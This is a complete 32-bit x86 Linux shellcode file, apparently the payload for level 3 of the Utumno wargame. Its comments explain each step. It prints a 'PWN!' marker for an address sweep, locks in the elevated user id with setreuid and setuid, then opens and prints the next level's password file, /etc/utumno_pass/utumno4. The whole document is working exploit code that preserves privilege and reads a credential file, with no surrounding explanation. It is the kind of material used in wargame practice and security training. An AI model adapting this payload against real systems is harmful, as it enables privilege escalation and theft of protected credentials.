BITS 32
global _start
_start:
    ; write(1, "PWN!", 4) -- marker so the address sweep can tell a hit from a crash
    xor eax, eax
    push eax
    push 0x214e5750
    mov ecx, esp
    xor ebx, ebx
    inc ebx
    xor edx, edx
    mov dl, 4
    mov al, 4
    int 0x80
    ; euid = geteuid(); setreuid(euid,euid)
    xor eax, eax
    mov al, 201
    int 0x80
    mov ebx, eax
    mov ecx, eax
    xor eax, eax
    mov al, 70
    int 0x80
    ; setuid(euid) -- real, effective AND saved, so the privilege survives
    xor eax, eax
    mov al, 201
    int 0x80
    mov ebx, eax
    xor eax, eax
    mov al, 23
    int 0x80
    ; "/etc/utumno_pass/utumno4" pushed as six little-endian dwords.
    ; The shellcode reads the file itself because utumno3's getchar loop has
    ; already consumed all of stdin -- a spawned shell would get no commands.
    xor eax, eax
    push eax                ; NUL terminator
    push 0x346f6e6d         ; "mno4"
    push 0x7574752f         ; "/utu"
    push 0x73736170         ; "pass"
    push 0x5f6f6e6d         ; "mno_"
    push 0x7574752f         ; "/utu"
    push 0x6374652f         ; "/etc"
    mov ebx, esp
    xor ecx, ecx
    xor eax, eax
    mov al, 5               ; open(path, O_RDONLY)
    int 0x80
    ; read(fd, buf, 64)
    mov ebx, eax
    sub esp, 64
    mov ecx, esp
    xor edx, edx
    mov dl, 64
    xor eax, eax
    mov al, 3
    int 0x80
    ; write(1, buf, n)
    mov edx, eax
    xor ebx, ebx
    inc ebx
    mov ecx, esp
    xor eax, eax
    mov al, 4
    int 0x80
    ; exit(0)
    xor eax, eax
    inc eax
    xor ebx, ebx
    int 0x80
